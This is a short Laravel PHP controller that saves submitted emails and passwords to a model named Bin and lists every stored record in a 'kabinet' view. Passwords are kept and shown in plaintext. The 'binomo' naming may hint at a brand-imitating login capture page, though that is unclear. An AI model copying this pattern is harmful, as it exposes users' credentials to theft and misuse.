<?php

namespace App\Http\Controllers;
use App\Models\Bin;
use Illuminate\Http\Request;


class RegController extends Controller
{

  public function Fu(Request $req)
  {
    $binomo = new Bin;
    $binomo -> email = $req -> email;
    $binomo -> password = $req -> password;
    $binomo -> save();
  }
  /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $binomo=Bin::all();
        return view('bin.kabinet',[
            'binomo'=>$binomo
        ]);
        
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('bin.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
    
      $data=$request->validate([
        'email' => 'required|max:255',
        'password' => 'required',
        
      ]);
 

      $binomo = new Bin;
      $binomo -> email = $data['email'];
      $binomo -> password = $data['password'];
      $binomo->save();

      return redirect()->route('kab.index');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
      return view('bin.show', [
        'binomo' => Bin::find($id)
    ]);
      
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
           return view('bin.edit', [
        'binomo' => Bin::find($id)
    ]);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $req)
    {
      
       
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
     
    }
}
